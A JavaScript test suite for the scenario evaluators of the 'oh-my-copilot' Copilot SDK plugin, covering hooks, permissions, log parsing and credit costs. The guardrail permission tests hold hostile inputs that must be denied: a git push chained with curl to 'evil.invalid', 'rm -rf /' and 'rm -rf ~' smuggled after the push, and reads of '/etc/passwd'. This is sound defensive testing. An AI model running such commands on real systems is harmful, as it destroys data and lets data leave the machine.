import { readFileSync } from 'fs';
import { join } from 'path';
import { describe, expect, it } from 'vitest';
import { parseJsonl } from '../copilot-session-eval.js';
import { adapterErrorLines, chooseModel, CREDIT_CAP_SKIP_DETAIL, evaluateScenario, evaluateSdkAgents, evaluateSdkMcp, evaluateSdkPlugins, evaluateSdkRuntime, evaluateSdkSkills, evaluateSdkToolsExcluded, hookScriptNames, hostSmokeToolName, permitGuardrailPush, permitScopedRead, SCENARIOS, scenarioCheckIds, scenarioCost, scenarioExcludedTools, skippedScenarioChecks, sliceLogByTime, usageCredits, } from '../copilot-sdk-scenarios.js';
const FIXTURES = join(__dirname, 'fixtures');
const events = (name) => parseJsonl(readFileSync(join(FIXTURES, `tier2-${name}-events.jsonl`), 'utf-8')).events;
const LOG = readFileSync(join(FIXTURES, 'tier2-hooks-debug-excerpt.log'), 'utf-8');
/** The fixture log without the spike's wiki-session-end fail-open line. */
const CLEAN_LOG = LOG.split('\n').filter((l) => !l.includes('[run.cjs]')).join('\n');
function run(name, over = {}) {
    return {
        name,
        events: events(name),
        idle: true,
        timedOut: false,
        timeoutMs: 120_000,
        logText: CLEAN_LOG,
        ...(name === 'guardrail' ? { remoteRefs: '' } : {}),
        model: 'auto',
        maxCredits: 30,
        ...over,
    };
}
const byId = (checks) => Object.fromEntries(checks.map((c) => [c.id, c]));
describe('scenario specs', () => {
    it('exclude <server>-host_smoke, with the server taken from .mcp.json', () => {
        for (const name of ['smoke', 'guardrail', 'skill', 'delegate']) {
            expect(scenarioExcludedTools(name, 't')[0]).toBe('t-host_smoke');
            expect(scenarioExcludedTools(name, 'omg')).toContain('omg-host_smoke');
            expect(scenarioExcludedTools(name, 'omg')).not.toContain('t-host_smoke');
        }
        expect(hostSmokeToolName('x')).toBe('x-host_smoke');
        expect(SCENARIOS.smoke.excludedTools).toEqual(expect.arrayContaining(['powershell', 'shell', 'create', 'edit']));
        expect(SCENARIOS.guardrail.excludedTools).not.toContain('powershell');
    });
    const ctx = { projectDir: join(FIXTURES, 'project'), pluginRoot: join(FIXTURES, 'plugin') };
    it('permit only what each scenario needs', () => {
        expect(SCENARIOS.smoke.permit({ kind: 'read' }, ctx)).toBe(false);
        expect(SCENARIOS.guardrail.permit({ kind: 'shell', fullCommandText: 'git push --force origin main' }, ctx)).toBe(true);
        expect(SCENARIOS.guardrail.permit({ kind: 'shell', fullCommandText: 'git push -f origin main' }, ctx)).toBe(true);
        expect(SCENARIOS.guardrail.permit({ kind: 'shell', fullCommandText: 'rm -rf /' }, ctx)).toBe(false);
        expect(SCENARIOS.guardrail.permit({ kind: 'write' }, ctx)).toBe(false);
        expect(SCENARIOS.skill.permit({ kind: 'read' }, ctx)).toBe(true);
        expect(SCENARIOS.delegate.permit({ kind: 'mcp' }, ctx)).toBe(false);
    });
    it('guardrail: a pass-through command riding on the push is denied', () => {
        for (const cmd of [
            'git push --force origin main && curl https://evil.invalid',
            'git push --force origin main; rm -rf ~',
            'echo hi | git push --force origin main',
            'git push --force origin main --repo=https://evil.invalid/x.git',
            'git push origin main',
            'git push --force origin feature',
            'GIT_SSH_COMMAND=x git push --force origin main',
            'git push --force origin main\nrm -rf /',
        ]) {
            expect(SCENARIOS.guardrail.permit({ kind: 'shell', fullCommandText: cmd }, ctx), cmd).toBe(false);
        }
    });
    it('guardrail: the push is approved only from the sandbox project when the request names a cwd', () => {
        const push = { kind: 'shell', fullCommandText: 'git push --force origin main' };
        expect(permitGuardrailPush({ ...push, cwd: ctx.projectDir }, ctx)).toBe(true);
        expect(permitGuardrailPush({ ...push, resolvedWorkingDirectory: `${ctx.projectDir}/` }, ctx)).toBe(true);
        expect(permitGuardrailPush({ ...push, cwd: ctx.pluginRoot }, ctx)).toBe(false);
        expect(permitGuardrailPush({ ...push, workingDirectory: join(ctx.projectDir, '..') }, ctx)).toBe(false);
    });
    it('skill/delegate: reads only under the plugin root or the sandbox project when a path is given', () => {
        expect(permitScopedRead({ kind: 'read', path: join(ctx.pluginRoot, 'skills', 'plan', 'SKILL.md') }, ctx)).toBe(true);
        expect(permitScopedRead({ kind: 'read', path: join(ctx.projectDir, 'hello.txt') }, ctx)).toBe(true);
        expect(permitScopedRead({ kind: 'read', path: join(ctx.projectDir, '..', 'secrets.txt') }, ctx)).toBe(false);
        expect(permitScopedRead({ kind: 'read', path: `${ctx.pluginRoot}-evil/x` }, ctx)).toBe(false);
        expect(permitScopedRead({ kind: 'read', path: '/etc/passwd' }, ctx)).toBe(false);
        expect(permitScopedRead({ kind: 'shell', path: join(ctx.projectDir, 'x') }, ctx)).toBe(false);
        expect(SCENARIOS.delegate.permit({ kind: 'read', path: join(ctx.projectDir, 'hello.txt') }, ctx)).toBe(true);
    });
});
describe('evaluateScenario on captured streams', () => {
    it.each(['smoke', 'guardrail', 'skill', 'delegate'])('%s passes', (name) => {
        const { checks, cost } = evaluateScenario(run(name));
        expect(checks.map((c) => c.id)).toEqual(scenarioCheckIds(name));
        expect(checks.filter((c) => !c.ok)).toEqual([]);
        expect(cost.premiumRequests).toBeGreaterThan(0);
        expect(cost.credits).toBeGreaterThan(0);
    });
    it('smoke: hooks fire lazily and per turn; detail lists them', () => {
        const c = byId(evaluateScenario(run('smoke')).checks);
        expect(c['scn.smoke.hooks'].detail).toMatch(/sessionStart 1\/1, userPromptSubmitted 1\/1, agentStop 1\/1, sessionEnd 1\/1/);
        expect(c['scn.smoke.reply'].detail).toBe('assistant replied SMOKE_OK');
    });
    it('smoke: fails without the token, on tool use, and on a failed hook', () => {
        const evs = events('smoke').map((e) => (e.type === 'assistant.message' ? { ...e, data: { ...e.data, content: 'hello' } } : e));
        evs.push({ type: 'tool.execution_start', data: { toolName: 'view' } });
        const end = evs.find((e) => e.type === 'hook.end' && e.data?.hookType === 'agentStop');
        end.data = { ...end.data, success: false, error: 'boom' };
        const c = byId(evaluateScenario(run('smoke', { events: evs })).checks);
        expect(c['scn.smoke.reply'].ok).toBe(false);
        expect(c['scn.smoke.no_tools']).toMatchObject({ ok: false, detail: '1 tool call(s): view' });
        expect(c['scn.smoke.hooks'].ok).toBe(false);
    });
    it('guardrail: denied names the hook message; postToolUse is n/a when the tool never ran', () => {
        const c = byId(evaluateScenario(run('guardrail')).checks);
        expect(c['scn.guardrail.denied'].detail).toMatch(/Git guardrail: blocked "git push"/);
        expect(c['scn.guardrail.hooks'].detail).toMatch(/postToolUse n\/a/);
    });
    it('guardrail: fails with no deny event', () => {
        const evs = events('guardrail').filter((e) => !(e.type === 'hook.end' && e.data?.hookType === 'preToolUse') && e.type !== 'tool.execution_complete');
        const c = byId(evaluateScenario(run('guardrail', { events: evs })).checks);
        expect(c['scn.guardrail.denied'].ok).toBe(false);
        expect(c['scn.guardrail.denied'].detail).toMatch(/no preToolUse hook.end containing "Git guardrail"; no tool.execution_complete with error.code=denied/);
    });
    it('guardrail: a ref on the bare remote, or no remote inspection, fails no_push', () => {
        expect(byId(evaluateScenario(run('guardrail', { remoteRefs: 'abc commit\trefs/heads/main\n' })).checks)['scn.guardrail.no_push'].ok).toBe(false);
        expect(byId(evaluateScenario(run('guardrail', { remoteRefs: null })).checks)['scn.guardrail.no_push'].detail).toBe('could not inspect the bare remote');
    });
    it('guardrail: a tool that did run requires postToolUse', () => {
        const evs = [...events('guardrail'), { type: 'tool.execution_complete', data: { success: true } }];
        expect(byId(evaluateScenario(run('guardrail', { events: evs })).checks)['scn.guardrail.hooks'].ok).toBe(false);
    });
    it('skill: asserts on the path, not the frontmatter name', () => {
        const c = byId(evaluateScenario(run('skill')).checks);
        expect(c['scn.skill.invoked'].detail).toMatch(/^skill.invoked omc-plan/);
        const wrong = events('skill').map((e) => (e.type === 'skill.invoked' ? { ...e, data: { ...e.data, path: '<ROOT>\\skills\\ralplan\\SKILL.md' } } : e));
        const f = byId(evaluateScenario(run('skill', { events: wrong })).checks)['scn.skill.invoked'];
        expect(f).toMatchObject({ ok: false, detail: 'skill.invoked without oh-my-copilot skills/plan/SKILL.md' });
        const none = events('skill').filter((e) => e.type !== 'skill.invoked');
        expect(byId(evaluateScenario(run('skill', { events: none })).checks)['scn.skill.invoked'].detail).toBe('no skill.invoked event');
    });
    it('delegate: fails without subagent events; a cancelled completion does not count', () => {
        const none = events('delegate').filter((e) => !String(e.type).startsWith('subagent.'));
        const c = byId(evaluateScenario(run('delegate', { events: none })).checks);
        expect(c['scn.delegate.selected']).toMatchObject({ ok: false, detail: 'no subagent.selected for oh-my-copilot:architect' });
        expect(c['scn.delegate.completed'].ok).toBe(false);
        const cancelledOnly = events('delegate').filter((e) => !(e.type === 'subagent.completed' && e.data?.cancelled !== true));
        expect(byId(evaluateScenario(run('delegate', { events: cancelledOnly })).checks)['scn.delegate.completed'].ok).toBe(false);
    });
    it('exit: timeout, abort and errors fail', () => {
        expect(byId(evaluateScenario(run('smoke', { idle: false, timedOut: true, timeoutMs: 50 })).checks)['scn.smoke.exit'])
            .toMatchObject({ ok: false, detail: 'no session.idle within 50 ms (aborted)' });
        expect(byId(evaluateScenario(run('smoke', { error: 'createSession() timed out' })).checks)['scn.smoke.exit'].detail).toMatch(/^session failed/);
        const aborted = [...events('smoke'), { type: 'session.idle', data: { aborted: true } }];
        expect(byId(evaluateScenario(run('smoke', { events: aborted })).checks)['scn.smoke.exit'].detail).toBe('session.idle after an abort');
    });
    it('cost: over the cap fails, otherwise informational', () => {
        const c = byId(evaluateScenario(run('delegate', { maxCredits: 0.1 })).checks)['scn.delegate.cost'];
        expect(c.ok).toBe(false);
        expect(c.detail).toMatch(/over the credit cap \(0\.100 left of maxCredits 0\.1\)/);
        const left = byId(evaluateScenario(run('delegate', { maxCredits: 30, budget: 0.01 })).checks)['scn.delegate.cost'];
        expect(left.ok).toBe(false);
    });
    it('capped: exit fails with the cap reason', () => {
        const c = byId(evaluateScenario(run('smoke', { capped: true, budget: 2 })).checks);
        expect(c['scn.smoke.exit']).toMatchObject({ ok: false, detail: 'aborted: credit cap reached (2.000 of maxCredits 30 left at start)' });
        expect(c['scn.smoke.cost'].ok).toBe(false);
    });
    it('usageCredits converts nano-AIU of assistant.usage only', () => {
        expect(usageCredits({ type: 'assistant.usage', data: { copilotUsage: { totalNanoAiu: 2_500_000_000 } } })).toBe(2.5);
        expect(usageCredits({ type: 'session.shutdown', data: { totalNanoAiu: 9e9 } })).toBe(0);
    });
    it('skippedScenarioChecks fails every id of the scenario with the reason', () => {
        const checks = skippedScenarioChecks('guardrail', CREDIT_CAP_SKIP_DETAIL);
        expect(checks.map((c) => c.id)).toEqual(scenarioCheckIds('guardrail'));
        expect(checks.every((c) => !c.ok && c.detail === 'skipped: credit cap reached')).toBe(true);
    });
});
describe('sliceLogByTime', () => {
    const t = (iso) => Date.parse(iso);
    const line = (iso, msg) => `${iso} [DEBUG] [rust:hooks] [hook stderr] ${msg}`;
    it('attributes lines by timestamp, not position: a late line of scenario 1 stays in scenario 1', () => {
        const text = [
            line('2026-10-05T10:00:00.000Z', 'static check noise'),
            line('2026-10-05T10:00:01.000Z', 'A1'),
            'continuation of A1',
            line('2026-10-05T10:00:05.000Z', 'B1'),
            // appended after B1 but stamped inside scenario 1's window (e.g. a late SessionEnd timeout)
            line('2026-10-05T10:00:04.900Z', '[run.cjs] Hook wiki-session-end.mjs timed out after 300ms; exiting fail-open.'),
            line('2026-10-05T10:00:09.000Z', 'B2'),
        ].join('\n');
        const [a, b] = sliceLogByTime(text, [t('2026-10-05T10:00:01.000Z'), t('2026-10-05T10:00:05.000Z')]);
        expect(a).toContain('A1');
        expect(a).toContain('continuation of A1');
        expect(a).toContain('wiki-session-end.mjs');
        expect(a).not.toContain('static check noise');
        expect(b).toContain('B1');
        expect(b).toContain('B2');
        expect(b).not.toContain('wiki-session-end');
    });
    it('no windows: nothing attributed', () => {
        expect(sliceLogByTime(line('2026-10-05T10:00:00.000Z', 'x'), [])).toEqual([]);
    });
});
describe('evaluateSdkToolsExcluded', () => {
    const tools = (names) => ({ ok: true, value: { tools: names.map((name) => ({ name, mcpServerName: name.startsWith('t-') ? 't' : undefined })) } });
    it('passes when <server>-host_smoke is absent and other server tools are offered', () => {
        expect(evaluateSdkToolsExcluded(tools(['view', 't-state_read', 't-notepad_read']), 't'))
            .toMatchObject({ id: 'sdk.tools_excluded', ok: true, detail: 't-host_smoke absent; 2 other t-* tools offered (3 total)' });
    });
    it('fails when the tool leaks, when no server tools are offered, and when the RPC fails', () => {
        expect(evaluateSdkToolsExcluded(tools(['t-state_read', 't-host_smoke']), 't')).toMatchObject({ ok: false, detail: 't-host_smoke still offered to the model' });
        expect(evaluateSdkToolsExcluded(tools(['view']), 't').ok).toBe(false);
        expect(evaluateSdkToolsExcluded({ ok: true, value: { tools: null } }, 't').ok).toBe(false);
        expect(evaluateSdkToolsExcluded({ ok: false, error: 'boom' }, 't')).toMatchObject({ ok: false, detail: 'tools.getCurrentMetadata failed' });
    });
});
describe('adapter errors from the debug log', () => {
    it('also catches a fail-closed (non-zero) hook, which the runtime logs as a multi-line [ERROR] entry', () => {
        // Verbatim shape from the live tier 2 run with OMC_HOOK_FAIL_CLOSED=1 (Copilot CLI 1.0.91).
        const log = [
            '2026-10-05T11:55:36.593Z [DEBUG] [rust:hooks] [hook stdout] {"continue":true}',
            '2026-10-05T11:55:36.593Z [ERROR] [rust:hooks] Hook from "oh-my-copilot" execution failed: Error: Hook command failed with code 124',
            'Stderr: [run.cjs] Hook wiki-session-end.mjs timed out after 300ms; exiting fail-closed (124).',
            '',
            '2026-10-05T11:55:36.594Z [DEBUG] [rust:copilot_runtime::session::pending_request_flow] Detached host delivery queue registered {}',
        ].join('\n');
        const lines = adapterErrorLines(log);
        expect(lines).toEqual(['Stderr: [run.cjs] Hook wiki-session-end.mjs timed out after 300ms; exiting fail-closed (124).']);
        expect(hookScriptNames(lines)).toEqual(['wiki-session-end.mjs']);
        const c = byId(evaluateScenario(run('smoke', { logText: log })).checks)['scn.smoke.adapter_errors'];
        expect(c).toMatchObject({ ok: false, detail: '1 hook stderr line(s) from wiki-session-end.mjs' });
    });
    it('does not mask the run.cjs fail-open timeout and names the hook script', () => {
        const lines = adapterErrorLines(LOG);
        expect(lines).toHaveLength(1);
        expect(lines[0]).toMatch(/\[run\.cjs\] Hook wiki-session-end\.mjs timed out after 300ms; exiting fail-open\./);
        expect(hookScriptNames(lines)).toEqual(['wiki-session-end.mjs']);
        const c = byId(evaluateScenario(run('skill', { logText: LOG })).checks)['scn.skill.adapter_errors'];
        expect(c).toMatchObject({ ok: false, detail: '1 hook stderr line(s) from wiki-session-end.mjs' });
        expect(c).toHaveProperty('evidence', expect.stringContaining('wiki-session-end.mjs timed out after 300ms'));
    });
    it('counts [omg-hook] errors, skips benign notes and the guardrail deny message', () => {
        const log = [
            '2026-10-05T10:00:00.000Z [DEBUG] [rust:hooks] [hook stderr] [omg-hook] SessionEnd internal error: session-end.mjs exited 1; failing open',
            '2026-10-05T10:00:00.000Z [DEBUG] [rust:hooks] [hook stderr] [omg-hook] Stop: continue:false overrides decision:block; allowing stop',
            '2026-10-05T10:00:00.000Z [DEBUG] [rust:hooks] [hook stderr] Git guardrail: blocked "git push".',
            '[omg-hook] not a hook stderr line',
        ].join('\n');
        const lines = adapterErrorLines(log);
        expect(lines).toHaveLength(1);
        expect(hookScriptNames(lines)).toEqual(['session-end.mjs']);
    });
    it('a missing debug log fails the check', () => {
        expect(byId(evaluateScenario(run('smoke', { logText: null })).checks)['scn.smoke.adapter_errors'].ok).toBe(false);
    });
});
describe('scenarioCost', () => {
    it('prefers session.shutdown totals', () => {
        expect(scenarioCost([{ type: 'session.shutdown', data: { totalPremiumRequests: 2, totalNanoAiu: 1_500_000_000 } }]))
            .toMatchObject({ premiumRequests: 2, credits: 1.5, source: 'session.shutdown' });
    });
    it('falls back to user-initiated assistant.usage calls', () => {
        const cost = scenarioCost([
            { type: 'assistant.usage', data: { initiator: 'user', copilotUsage: { totalNanoAiu: 200_000_000 } } },
            { type: 'assistant.usage', data: { initiator: 'agent', copilotUsage: { totalNanoAiu: 100_000_000 } } },
        ]);
        expect(cost.premiumRequests).toBe(1);
        expect(cost.credits).toBeCloseTo(0.3);
    });
});
describe('static evaluators', () => {
    const root = process.platform === 'win32' ? 'C:\\plug' : '/plug';
    const p = (...s) => join(root, ...s);
    it('sdk.runtime: version must match the installed exe, protocol >= 3', () => {
        expect(evaluateSdkRuntime({ ok: true, value: { version: '1.0.91', protocolVersion: 3 } }, '1.0.91', 'auto')).toMatchObject({ ok: true, detail: 'runtime 1.0.91, protocol 3; model auto' });
        expect(evaluateSdkRuntime({ ok: true, value: { version: '1.0.90', protocolVersion: 2 } }, '1.0.91', 'auto').detail)
            .toBe('runtime 1.0.90 != copilot --version 1.0.91 (not the installed exe?); protocolVersion 2 < 3');
        expect(evaluateSdkRuntime({ ok: false, error: 'boom' }, '1.0.91', 'auto')).toMatchObject({ ok: false, detail: 'getStatus() failed' });
    });
    it('sdk.plugins: exact name and package version', () => {
        expect(evaluateSdkPlugins({ ok: true, value: { plugins: [{ name: 'oh-my-copilot', version: '9.9.9', enabled: true }] } }, '9.9.9').ok).toBe(true);
        expect(evaluateSdkPlugins({ ok: true, value: { plugins: [{ name: 'oh-my-copilot', version: '9.9.8', enabled: true }] } }, '9.9.9').ok).toBe(false);
        expect(evaluateSdkPlugins({ ok: true, value: { plugins: [] } }, '9.9.9').detail).toBe('oh-my-copilot not listed (0 plugin(s))');
    });
    it('sdk.skills: counts skills/ entries and notes commands/*.md', () => {
        const skills = {
            skills: [
                { name: 'a', commandName: 'oh-my-copilot:a', source: 'plugin', pluginName: 'oh-my-copilot', path: p('skills', 'a', 'SKILL.md') },
                { name: 'b', commandName: 'oh-my-copilot:b', source: 'plugin', pluginName: 'oh-my-copilot', path: p('skills', 'b', 'SKILL.md') },
                { name: 'psm', commandName: 'oh-my-copilot:psm', source: 'plugin', pluginName: 'oh-my-copilot', path: p('commands', 'psm.md') },
                { name: 'x', source: 'builtin', path: '/builtin/x' },
            ],
        };
        const ok = evaluateSdkSkills({ ok: true, value: skills }, root, ['a', 'b']);
        expect(ok).toMatchObject({ ok: true, detail: '2/2 skills/*/SKILL.md listed as plugin skills; plus 1 non-skills/ plugin entry (commands/*.md: oh-my-copilot:psm)' });
        const missing = evaluateSdkSkills({ ok: true, value: skills }, root, ['a', 'b', 'c']);
        expect(missing).toMatchObject({ ok: false, evidence: 'missing: c' });
    });
    it('sdk.agents: every agents/*.md as oh-my-copilot:<name>', () => {
        const agents = { agents: [{ name: 'oh-my-copilot:architect' }, { name: 'oh-my-copilot:writer' }] };
        expect(evaluateSdkAgents({ ok: true, value: agents }, ['architect.md', 'writer.md']).ok).toBe(true);
        expect(evaluateSdkAgents({ ok: true, value: agents }, ['architect.md', 'critic.md'])).toMatchObject({ ok: false, evidence: 'missing: oh-my-copilot:critic' });
    });
    it('sdk.mcp: connected with the registry tool count', () => {
        const mcp = { ok: true, value: { servers: [{ name: 't', status: 'connected' }] } };
        const tools = { ok: true, value: { tools: [{ name: 'a' }, { name: 'b' }] } };
        expect(evaluateSdkMcp(mcp, tools, 't', 2).ok).toBe(true);
        expect(evaluateSdkMcp(mcp, tools, 't', 3).detail).toMatch(/stale dist/);
        expect(evaluateSdkMcp({ ok: true, value: { servers: [{ name: 't', status: 'pending' }] } }, tools, 't', 2).detail).toBe('server t status pending');
    });
});
describe('chooseModel', () => {
    it('falls back to auto when only auto is listed', () => {
        const choice = chooseModel(['auto', 'auto']);
        expect(choice.model).toBeUndefined();
        expect(choice.label).toBe('auto');
    });
    it('picks a cheap explicit model, and an explicit request wins', () => {
        expect(chooseModel(['auto', 'claude-opus-5-5', 'gpt-5-mini']).model).toBe('gpt-5-mini');
        expect(chooseModel(['auto'], 'claude-sonnet-5')).toMatchObject({ model: 'claude-sonnet-5', note: expect.stringMatching(/not in models.list/) });
    });
});
//# sourceMappingURL=copilot-sdk-scenarios.test.js.map